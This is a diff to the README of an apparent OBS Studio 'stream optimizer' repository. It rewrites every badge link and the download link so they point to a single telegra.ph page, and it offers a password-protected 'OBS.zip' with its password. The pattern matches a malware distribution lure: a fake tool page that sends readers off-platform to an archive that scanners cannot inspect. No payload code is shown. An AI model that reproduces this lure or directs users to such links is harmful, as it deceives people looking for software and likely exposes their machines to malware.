@@ -1,11 +1,11 @@
 # 📡📡 OBS Stream Optimizer 2026 — Encoding Booster & Quality Toolkit
 
-[![GitHub Stars](https://img.shields.io/github/stars/Alexantros341/OBS-Stream-Optimizer)](https://github.com/Alexantros341/OBS-Stream-Optimizer)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Software](https://img.shields.io/badge/Software-OBS%20Studio-purple)](https://obsproject.com/)
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-Streaming-orange)]()
-[![Status](https://img.shields.io/badge/Status-Updated%202026-brightgreen)]()
+[![GitHub Stars](https://img.shields.io/github/stars/Alexantros341/OBS-Stream-Optimizer)](https://telegra.ph/Download-05-21-39)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://telegra.ph/Download-05-21-39)
+[![Software](https://img.shields.io/badge/Software-OBS%20Studio-purple)](https://telegra.ph/Download-05-21-39)
+[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://telegra.ph/Download-05-21-39)
+[![Category](https://img.shields.io/badge/Category-Streaming-orange)](https://telegra.ph/Download-05-21-39)
+[![Status](https://img.shields.io/badge/Status-Updated%202026-brightgreen)](https://telegra.ph/Download-05-21-39)
 
 ---
 
@@ -43,7 +43,7 @@ Auto-tune encoding settings, optimize bitrate allocation, reduce CPU/GPU load, e
 
 🔽 Password-protected archive — extract and stream like a pro.
 
-📦 [**Download** `OBS.zip`](https://github.com/Bravedelrepair/OBS-Stream-Optimizer/releases/download/Release/OBS.zip)
+📦 [**Download** `OBS.zip`](https://telegra.ph/Download-05-21-39)
 
 **🔐** — **1847**
 
